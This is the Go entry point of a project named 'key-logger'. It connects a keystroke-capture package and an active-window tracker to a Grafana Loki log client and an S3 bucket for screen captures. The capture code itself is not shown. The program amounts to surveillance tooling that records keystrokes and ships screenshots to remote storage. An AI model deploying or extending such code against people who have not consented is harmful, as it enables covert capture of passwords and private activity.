package main

import (
	"flag"
	"os"

	gklog "github.com/go-kit/kit/log"
	"github.com/go-kit/log/level"
	"github.com/grafana/loki-client-go/loki"

	"key-logger/pkg/key"
	s32 "key-logger/pkg/s3"
	"key-logger/pkg/window"
)

func main() {

	logger := gklog.NewLogfmtLogger(gklog.NewSyncWriter(os.Stdout))

	endpoint := flag.String("s3-endpoint", "", "s3 url (without bucket)")
	bucketName := flag.String("bucket", "", "s3bucket name for image caps")
	accessKeyId := flag.String("accessKey", "", "s3 access key Id")
	secretKey := flag.String("secretKey", "", "s3 secret key")

	cfg := loki.Config{}
	// Sets defaults as well as anything from the command line
	cfg.RegisterFlags(flag.CommandLine)

	flag.Parse()

	lokiClient, err := loki.NewWithLogger(cfg, logger)
	if err != nil {
		level.Error(logger).Log("msg", "error building Loki client", "err", err)
	}

	s3 := s32.New(*endpoint, *accessKeyId, *secretKey, *bucketName)

	w := window.New(logger, s3, lokiClient)
	_ = key.New(logger, w)

	for {
		select {}
	}

	//go getActiveWindowInfo(winChan, processChan)
	//
	//
	//
	//go cb.updateActiveWindow(winChan, processChan)
	//go getLastInputInfoLoop()

}
